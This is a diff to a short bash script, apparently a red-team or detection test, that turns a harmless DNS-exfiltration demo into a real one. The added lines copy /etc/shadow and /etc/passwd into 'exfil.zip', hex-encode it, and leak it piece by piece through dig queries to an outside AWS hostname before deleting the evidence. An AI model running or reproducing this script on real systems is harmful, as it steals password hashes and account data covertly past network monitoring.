@@ -1,10 +1,14 @@
 #! /bin/bash
  
-cd ~/Desktop
-touch 1.tmp 2.tmp 3.tmp 4.tmp 5.tmp 6.tmp 7.tmp 8.tmp 9.tmp 10.tmp
-zip fakefile.zip *.tmp
-rm 1.tmp 2.tmp 3.tmp 4.tmp 5.tmp 6.tmp 7.tmp 8.tmp 9.tmp 10.tmp
-xxd -p fakefile.zip > data
-rm fakefile.zip
-for dat in `cat data `; do dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done
-rm data 
+epoch=$(date +%s)
+mkdir $epoch && cd $epoch || exit 1
+cp /etc/shadow shadow.tmp
+cp /etc/passwd passwd.tmp
+zip exfil.zip *.tmp
+rm *.tmp
+xxd -p exfil.zip > data
+rm exfil.zip
+for dat in `cat data`; do dig $dat.legit.term01-b-449152202.us-west-1.elb.amazonaws.com; done
+rm data
+cd ..
+rmdir $epoch 
